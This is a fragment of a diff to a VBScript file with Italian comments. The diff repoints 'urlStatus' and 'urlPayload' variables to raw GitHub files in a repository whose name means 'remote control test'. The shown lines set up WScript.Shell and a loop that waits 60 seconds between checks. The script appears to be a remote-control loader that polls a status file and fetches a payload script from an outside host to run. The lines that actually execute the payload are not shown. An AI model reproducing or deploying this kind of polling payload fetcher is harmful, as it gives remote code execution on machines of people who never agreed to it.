@@ -8,8 +8,8 @@ Dim tempScriptPath, fileTemp
 
 ' --- CONFIGURAZIONE URL ---
 ' Questi URL puntano ai file nel tuo repository mostrato nell'immagine
-urlStatus  = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/status.txt"
-urlPayload = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/script.txt"
+urlStatus  = "https://raw.githubusercontent.com/StangaSquola/ProvaControlloRemoto/main/status.txt"
+urlPayload = "https://raw.githubusercontent.com/StangaSquola/ProvaControlloRemoto/main/script.txt"
 
 Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
@@ -61,3 +61,4 @@ Do
     ' 3. Attesa di 60 secondi prima del prossimo controllo
     WScript.Sleep 60000
 Loop
+
